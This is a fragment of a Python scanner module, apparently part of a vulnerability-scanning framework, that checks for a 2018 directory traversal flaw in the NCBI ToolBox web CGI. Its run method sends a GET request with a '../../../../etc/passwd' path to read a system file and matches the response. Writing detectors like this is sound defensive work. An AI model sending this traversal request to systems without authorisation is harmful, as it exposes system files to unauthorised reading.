...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NCBI ToolBox - Directory Traversal Detection',
        ...
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'ncbi', 'lfi', 'nih', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/blast/nph-viewgif.cgi?../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="NCBI ToolBox - Directory Traversal detected",
